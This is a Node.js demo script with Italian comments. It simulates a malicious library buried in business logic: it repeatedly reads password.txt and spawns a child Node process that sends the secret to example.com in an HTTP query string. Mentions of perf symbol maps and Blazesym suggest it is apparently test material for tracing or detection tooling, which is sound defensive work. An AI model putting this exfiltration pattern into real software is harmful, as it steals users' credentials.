const fs = require('fs');
const { spawn } = require('child_process'); // Usiamo spawn invece di exec!

function mainLogic() {
    console.log("\n[" + new Date().toISOString() + "] Eseguo logica di business...");
    businessLogic();
}

function businessLogic(){
    console.log("L'applicazione sta funzionando correttamente...");
    maliciousLibrary();
}

function maliciousLibrary() {
    stealSecrets();
}

function stealSecrets() {
    const targetFile = 'password.txt';

    try {
        const secret = fs.readFileSync(targetFile, 'utf8').trim(); 
        console.log(`[SUCCESSO] Letto contenuto di ${targetFile}: ${secret}`);

        console.log(`[ATTENZIONE] Avvio processo figlio (Node.js) per esfiltrazione di rete...`);
        
        // Lo script malevolo che il figlio eseguirà.
        // Usa il modulo 'http' per simulare una connessione verso un server esterno.
        const hackerScript = `
            const http = require('http');
            // Simuliamo l'invio della password tramite una richiesta GET
            http.get('http://example.com/?data=${secret}', (res) => {
                console.log("Dati esfiltrati con successo dal PID FIGLIO: " + process.pid);
            }).on('error', (e) => {
                console.error("Errore di rete nel figlio: " + e.message);
            });
        `;
        
        // SPAWN: Lanciamo direttamente Node.js aggirando la shell bash!
        // process.execPath punta all'eseguibile node.
        // Passiamo --perf-basic-prof così anche il figlio genera la mappa dei simboli per Blazesym!
        const child = spawn(process.execPath, ['--perf-basic-prof', '-e', hackerScript]);

        // Catturiamo l'output del figlio per stamparlo nel nostro terminale
        child.stdout.on('data', (data) => {
            console.log(`[OUTPUT FIGLIO] ${data.toString().trim()}`);
        });

        child.stderr.on('data', (data) => {
            console.error(`[ERRORE FIGLIO] ${data.toString().trim()}`);
        });

    } catch (e) {
        console.error(`[ERRORE] Impossibile leggere ${targetFile}: ${e.message}`);
        
        if (e.code === 'ENOENT') {
            fs.writeFileSync(targetFile, "super_secret_password_123");
            console.log(`[INFO] Creato file dummy '${targetFile}' per il prossimo giro.`);
        }
    }
}

// Avvio
console.log(`PID ROOT (Node.js): ${process.pid}`);
console.log("In attesa... (Premi Ctrl+C per terminare)");

setInterval(mainLogic, 5000);